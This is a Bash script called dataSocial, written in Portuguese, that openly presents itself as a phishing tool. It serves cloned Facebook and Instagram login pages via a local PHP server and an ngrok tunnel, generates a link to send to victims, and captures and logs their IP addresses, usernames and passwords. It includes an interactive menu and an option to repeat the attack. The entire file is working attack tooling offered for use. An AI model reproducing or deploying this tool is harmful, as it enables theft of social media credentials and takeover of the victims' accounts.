#!/usr/bin/env bash
# dataSocial - Pesca dados de redes sociais através de páginas sociais modificadas usando a técnica phishing de engenharia social
#
# Site		: https://programadorboard.epizy.com/autor
# Autor		: Oliver Silva <programadorboard@gmail.com>
# Manutênção 	: Oliver Silva <programadorboard@gmail.com>
#
# -------------------------------
# Este programa captura dados de redes sociais através de páginas sociais modificadas utilizando a técnica phishing de engenharia social.
#
# Exemplo:
#
# $ ./dataSocial -s facebook -l -t ngrok
#
# [+] Dados para enviar a vítima:
# [+] Localhost: localhost:5555
# [+] Ngrok localhost: http://localhost:5555
# [+] Ngrok URL: https://00c8-191-96-225-179.sa.ngrok.io
# [-] Nova conexão aberta: 127.0.0.1
# [-] Credenciais capturadas:
# [+] Seu log está em logs/dataSocial.txt
# [-] Usuário: example@server.com
# [-] Senha: teste
# [?] Digite 'ctr+C' OU 'quit' para cancelar OU 'rerun' para realizar novamente este ataque
# quit
#
# [×] Programa interrompido
#
# Histórico:
#
# v0.1 2022-11-28, Oliver Silva;
#     Adicionado suporte para facebook e instagram
# v0.2 2023-01-05, Oliver Silva:
#     Adicionado o comando JQ no lugar do GREP
# v0.3 2023-01-07, Oliver Silva:
#     Adicionado instalador de requisitos caso necessário
# v0.4 2023-01-08, Oliver Silva:
#     Adicionado o loop while no lugar da recursão infinita evitando o bug 'Segmentation fault'
# v0.5 2023-03-19, Oliver Silva:
#     Adicionado suporte a repetição do ataque
# v0.6 2023-03-31, Oliver Silva:
#     Adicionado suporte ao modo interativo
#
# Licença: MIT License
#
# Versão 0.1: Gera páginas somente facebook e instagram
# Versão 0.2: Troca do GREP pelo JQ pra formatação dos dados
# Versão 0.3: Instalador de requisitos
# Versão 0.4: Bug 'Segmentation fault' resolvido o qual foi causado pela recursão infinita
# Versão 0.5: Repetição do ataque caso precise
# Versão 0.6: Modo interativo adicionado
#

trap interruptTwo SIGINT SIGTSTP

host="localhost"
port="5555"

args=$@

serviceKey=0
listenKey=0
tunnelKey=0

listReq=("php" "jq" "curl" "tar")

verifySystemOs() {
    proot=$(ps -e | grep -Eo "proot")

    if [ -z "$proot" ] ; then
	echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mExecute este programa em uma shell proot\e[0m"
	interruptTwo
    fi
}

verifyLinks() {
    if [ "$1" == "null" -a "$2" == "null" ] ; then
	echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mLinks Ngrok nulos, execute este programa em outro tipo de shell proot ou execute este programa novamente\e[0m"
    fi
}

interrupt() {
    echo -e "\n\e[32m[\e[33;1m×\e[32m] \e[31;1mPrograma interrompido\e[0m"
    processKill
    removeFiles
    stty -echoctl
    #exit 1
}

interruptTwo() {
    interrupt
    exit 1
}

listen() {
    if  [ -n "$tunnel" -a "$tunnel" == "ngrok" ] ; then
	functionGroup

    else
	functionGroup

    fi
}

functionGroup() {
    verifySystemOs
    removeFiles
    copyFiles
    processKill
    installReqIfNotExists
    listenLocalhost

    echo -e "\e[32m[+] Dados para enviar a vítima:\e[0m"
    showLink
}

listenLocalhost() {
    php -S ${host}:${port} -t ./www > /dev/null 2>&1 &
    sleep 3
}

removeFiles() {
    [ -d ./www ] && rm ./www -rf
}

copyFiles() {
    [ ! -d ./www ] && mkdir ./www

    if [ -d websites/${service} ] ; then
	cp -rf websites/${service}/* ./www

    else
	echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mEste serviço não está disponível\e[0m"
	exit 1
    fi
}

tunnel() {
    if [ "$tunnel" == "ngrok" ] ; then
        ngrok http $port --log=stdout > /dev/null 2>&1 &
        sleep 3
        showLinkNgrok

    else
        echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mEste tunnel não está disponível\e[0m"
	exit 1
    fi
}


processKill() {
    [ $(ps -e | grep -Eo "php") ] && pkill php
    [ $(ps -e | grep -Eo "ngrok") ] && pkill ngrok
}

showLink() {
   echo -e "\e[32m[+] Localhost: \e[33;1m$host:$port\e[0m"
}

showLinkNgrok() {
    addr=$(curl -sS http://${host}:4040/api/tunnels | jq -r ".tunnels[0].config.addr")
    public=$(curl -sS http://${host}:4040/api/tunnels | jq -r ".tunnels[0].public_url")

    verifyLinks $addr $public

    echo -e "\e[32m[+] Ngrok localhost: \e[33;1m$addr\e[0m"
    echo -e "\e[32m[+] Ngrok URL: \e[33;1m$public\e[0m"

}
getDataCaptured() {
    get_ip
    get_data

    control
}

control() {
    echo -e "\e[32m[?] Digite '\e[33;1mctr+C\e[32m' \e[32mOU '\e[33;1mquit\e[32m' para cancelar OU '\e[33;1mrerun\e[32m' para realizar novamente este ataque";read

    if [ "$REPLY" == "rerun" ] ; then
	rerun

    elif [ "$REPLY" == "quit" ] ; then
        interruptTwo

    else
	control
    fi
}

get_ip() {
    while [ ! -f ./www/ip.txt ] ; do
	printf "\r\e[32m[*] Escultando conexão...\e[0m"
    done

    ip=$(cat ./www/ip.txt | grep -Eo ":.*" | tr -d \ :)
        printf "\r\e[32m[-] Nova conexão aberta: \e[33;1m$ip\e[0m\n"
}

get_data() {
    while [ ! -f ./www/src/dados.txt ] ; do 
	printf "\r\e[32m[*] Aguardando credenciais...\e[0m"
    done

    [ ! -d ./logs ] && mkdir logs

    cat ./www/src/dados.txt > ./logs/dataSocial.txt
    printf "\r\e[32m[-] Credenciais capturadas:   \e[0m\n"
    printf "\r\e[32m[+] Seu log está em \e[32;1mlogs/dataSocial.txt\e[0m\n"

    usuario=$(cat ./www/src/dados.txt | grep -Eo "Usuário:.*" | grep -Eo ":.*" | tr -d \ :)
    senha=$(cat ./www/src/dados.txt | grep -Eo "Senha:.*" | grep -Eo ":.*" | tr -d \ :)

    echo -e "\e[32m[-] Usuário: \e[34;1m$usuario\e[0m"
    echo -e "\e[32m[-] Senha: \e[34;1m$senha\e[0m"
}

banner() {
echo -e "\e[34m
	        '  
              '   '  TIOOLIVER | t.me/tiooliver_sh
            '       '   youtube.com/@tioolive - BRAZIL
        . ' .    '    '                       '
     ' 		    '	                   '   '
  █▀▄ ▄▀█ ▀█▀ ▄▀█   █▀ █▀█ █▀▀ █ ▄▀█ █░░
  █▄▀ █▀█ ░█░ █▀█   ▄█ █▄█ █▄▄ █ █▀█ █▄▄ 
  .			     ..'.    ' .
    '  .    		   .     '       '
          ' .  .  .  .  . '.    .'         '  '
	     '         '    '. '              .
	       '       '      '
	         ' .  '   Site: programadorboard.epizy.com 
\e[0m"
}

helper() {
    echo -e "Uso: $(basename "$0") [OPÇÔES]\n\t-h, --help\tMostra esta tela de ajuda e sai\n\t-v, --version\tMostra versão atual do programa\n\t-L, --list\tLista todos os serviços sociais disponíveis\n\t-s, --service\tSeleciona um serviço social\n\t-l, --listen\tAtiva esculta no localhost\ni\t-t, --tunnel\tTunela a conexão localhost\n\t-i, \n\t--interactive\tInicia o programa em modo interativo\n\nEXEMPLOS:\n\nLocalhost:\n\t${0} --service facebook --listen\nTunnel:\n\t${0} --service facebook --listen --tunnel ngrok"
    exit 0
}

version() {
    echo -ne "$(basename "$0")"
    grep "^# Versão" "$0" | tail -1 | cut -d ":" -f 1 | tr -d \# | tr A-Z a-z
}

list() {
    services=("facebook" "instagram")

    for service in ${services[@]} ; do
	echo -e "\e[0m\e[32m[√] $service\e[0m"
    done
}

installReqIfNotExists() {
    [ -d /usr/bin ] && dir=/usr/bin
    [ -d $PREFIX/bin ] && dir=$PREFIX/bin

    installForApt # Instala requisitos 

    case "$(dpkg --print-architecture)" in
	aarch64)
	    arch="arm64";;
        armhf | arm)
	    arch="arm";;
	amd64)
	    arch="amd64";;
	x86_84)
	    arch="amd64";;
	i*86)
	    arch="i386";;
	i386)
	    arch="i386";;
    *)
	echo "[!] Invalid architecture"
	exit 1
    esac

    link="https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-${arch}.tgz"

    if [ ! -f ${dir}/ngrok ] ; then
	printf "\r\e[33;1m[*] Instalando Ngrok...\e[0m"
	curl -LO $link > /dev/null 2>&1 &

	while [ -n "$(ps -e | grep -Eo 'curl')" ] ; do
	    printf "\r\e[33;1m[*] Instalando Ngrok..."
	
    	done
	printf "\r\e[33;1m[+] Instalando Ngrok...\e[32;1mOK\e[0m\n"
	while [ ! -f ${dir}/ngrok ] ; do
	    printf "\r\e[33;1m[*] Extraindo Ngrok...\e[0m"
	    tar -xvzf ngrok-v3-stable-linux-${arch}.tgz -C $dir > /dev/null
	done
	printf "\r\e[33;1m[+] Extraindo Ngrok...\e[32;1mOK\e[0m\n"
	rm ngrok-v3-stable-linux-${arch}.tgz
    fi
}

installForApt() {
    for package in ${listReq[*]} ; do
        if [ ! -f ${dir}/${package} ] ; then
	    if [ -d "$PREFIX" ] ; then
	        while [ ! -f ${dir}/${package} ] ; do
	            printf "\r\e[33;1m[*] Instalando $package...\e[0m"
		    apt update > /dev/null 2>&1
		    apt install $package -y > /dev/null 2>&1
 	        done
	        printf "\r\e[33;1m[+] Instalando $package...\e[32;1mOK\e[0m\n"
            else
	        while [ ! -f $dir/$package ] ; do
		    echo -e "\e[33;1m[*] Instalando $package...\e[0m"
		    apt-get update
		    apt-get upgrade -y
		    apt-get install $package -y
		done
		echo -e "\e[33;1m[+] Instalando $package...\e[32;1mOK\e[0m"
	    fi
	fi
    done
}


rerun() {
    echo -e "\e[32m[?] Realizar novamente este ataque? [y/n] : \e[0m" ; read

    if [ -z "$REPLY" ] ; then
	rerun

    elif [ -n "$REPLY" -a "$REPLY" == "y" -o "$REPLY" == "Y" ] ; then
	interrupt > /dev/null && ./dataSocial.sh $args

    elif [ -n "$REPLY" -a "$REPLY" == "n" -o "$REPLY" == "N" ] ; then
	interruptTwo

    else
	echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mResposta inválida, tente '\e[33;1my\e[31;1m' ou '\e[33;1mn\e[31;1m'\e[0m"
	rerun
    fi
}

if [ -z "$1" ] ; then
    banner
    echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mtente \e[33;1m-h\e[31;1m, \e[33;1m--help \e[31;1mpara ajuda\e[0m"
    exit 1
fi

# Modo janelas
menu() {
    while [ true ] ; do
	echo -ne "\e[34;2;4mdsl\e[0m > \e[34;2m" ; read
	if [ -z "$REPLY" ] ;then
	    echo -e "\e[0m\e[33;1mErro, tente ? ou help para mais ajuda!\e[0m"
	    menu
	
	elif [ "$REPLY" == "quit" -o "$REPLY" == "exit" ] ;then
	interrupt && exit 0

	elif [ "$REPLY" == "help" -o "$REPLY" == "?" ] ;then
	    echo -e "\n\n\t\e[0mhelp OR ?\tMostra esta tela de ajuda\n\tshow\t\tMostra todos os serviços\n\tuse service <S>\tUsa um serviço, substitua <S> pelo serviço\n\n"

	elif [ "$REPLY" == "show" ] ; then
	    list

        elif [ "${REPLY:0:3}" == "use" ] ;then
	    if [ "${REPLY:4:7}" == "service" ] ;then
		if [ -n "${REPLY:12:8}" ] ;then 
		    if [ "${REPLY:12}" == "facebook" -o "${REPLY:12}" == "instagram" ] ;then
			service=${REPLY:12}
		    	menuTunnel

		    else
			echo -e "\e[0m\e[33;1mServiço inválido\e[0m"
		    fi

	        else
		    echo -e "\e[0m\e[33;1mErro, faltou o serviço!\e[0m"

		fi

	    else
		echo -e "\e[0m\e[33;1mErro, tente ? ou help para mais ajuda!\e[0m"

	    fi

        else
	    echo -e "\e[0m\e[33;1mErro, tente ? ou help para mais ajuda!\e[0m"

	fi
    done
    interrupt
    exit 0
}

menuTunnel() {
    tunnel="None"

    while [ true ] ; do
	echo -ne "\e[34;2;4mdsl\e[0m \e[34m<\e[31m$service\e[34m> \e[34;2m" ; read

        if [ "${REPLY:0:4}" == "show" ] ;then	    
            if [ "${REPLY:5:7}" == "options" ] ;then
		echo -e "\n\n\t\e[0m\e[34;2mSelected service \e[32;2m=> \e[0m\t[\e[31m$service\e[0m]\n\t\e[34;2mSelected tunnel \e[32;2m=> \e[0m\t[\e[31m$tunnel\e[0m]\n\n"

	    else
		echo -e "\e[0m\e[33;1mErro, tente ? ou help para mais ajuda!\e[0m"
	    fi

	elif [ "${REPLY:0:3}" == "set" ] ; then
	    if [ "${REPLY:4:6}" == "tunnel" ] ;then
		if [ -n "${REPLY:11}" ] ;then

		    if [ "${REPLY:11}" == "ngrok" ] ;then
		        tunnel=${REPLY:11}

		    else
			echo -e "\e[0m\e[33;1mTunel inválido\e[0m"
		    fi

		else
		    tunnel="None"
		    echo -e "\e[0m\e[33;1mErro, faltou o tunel!\e[0m"

		fi

	    else
		echo -e "\e[0m\e[33;1mErro, tente ? ou help para mais ajuda!\e[0m"
	    fi

	elif [ "$REPLY" == "run" ] ;then
	    if [ -n "$service" -a -n "$tunnel" -a "$tunnel" == "ngrok" -o "$tunnel" == "ssh" ] ;then
	        echo -e "\e[0mRunning external..."
		args="--listen --service $service --tunnel $tunnel"
		listen && tunnel && getDataCaptured

	    elif [ -n "$service" -a "$tunnel" == "None" ] ;then
		echo -e "\e[0mRunning local..."
		args="--listen --service $service"
		listen && getDataCaptured

	    fi

	elif [ "$REPLY" == "back" -o "$REPLY" == "return" ] ;then
	    echo -e "\e[0m$REPLY => retornou ao inicio"
	    menu

	elif [ "$REPLY" == "help" -o "$REPLY" == "?" ] ;then
	    echo -e "\n\n\t\e[0mshow options\tMostra as opçôes padrôes\n\tset tunnel\tDefine um tunel\n\trun\t\tExecuta o serviço definido\n\tback ou return\tRetorna ao menu inicial\n\n"
	
	else
	    echo -e "\e[0m\e[33;1mErro, tente ? ou help para mais ajuda\e[0m"
	    
        fi
    done
}

banner_two() {
    version=$(grep "^# Versão" "$0" | tail -1 | cut -d ":" -f 1 | tr -d \# | tr -d " a-zãV")
    dateUpdate=$(grep "^# v.*" dataSocial.sh | cut -d , -f 1 | tr -d \# | tr -d "a-z." | cut -c5-15 | tail -1)

    echo -e "\n\n"
    toilet -f slant dataSocial --metal
    echo -e "\t\t--=[DataSocial Phishing\n\t+---**---==[Version :\e[31m$version\e[0m\n\t+---**---==[Codename :\e[31mLiving is not for the weak\e[0m\n\t+---**---==[Services : \e[32;2m2\e[0m\n\t\t--=[Update Date : [\e[31m$dateUpdate\e[0m]"
    echo -e "\n\n"
}

interactiveMode() {
    banner_two
    menu
}

while [ -n "$1" ] ; do
    case "$1" in
	-h | --help)
	    helper;;
	-v | --version)
	    version && exit 0;;
	-L | --list)
	    list && exit 0;;
	-s | --service)
	    shift

	    if [ -z "$1" ] ; then
		echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mFaltou expecificar o serviço social\e[0m"
		exit 1
	    fi

	    serviceKey=1
	    service="$1";;

	-l | --listen)
	    listenKey=1;;
	-t | --tunnel)
	    shift

	    if [ -z "$1" ] ; then
		echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mFaltou expecificar o tunnel\e[0m"
		exit 1
	    fi

	    tunnelKey=1
	    tunnel="$1"
	    ;;
        -i | --interactive)
	    interactiveMode;;

	*)
	    echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mOpção inválida: \e[33;1m$1\e[0m" && exit 1;;
    esac
    shift
done

if [ "$serviceKey" == 1 -a "$listenKey" == 1 -a "$tunnelKey" == 0 ] ; then
    banner && listen && getDataCaptured

elif [ "$serviceKey" == 1 -a "$listenKey" == 1 -a "$tunnelKey" == 1 ] ; then
    banner && listen && tunnel && getDataCaptured

else
    echo -e "\e[32m[\e[33;1m!\e[32m] \e[31;1mErro ao processar o comando, tente: \e[33;1m-h\e[31;1m, \e[33;1m--help \e[31;1mpara mais detalhes\e[0m"
    exit 1
fi
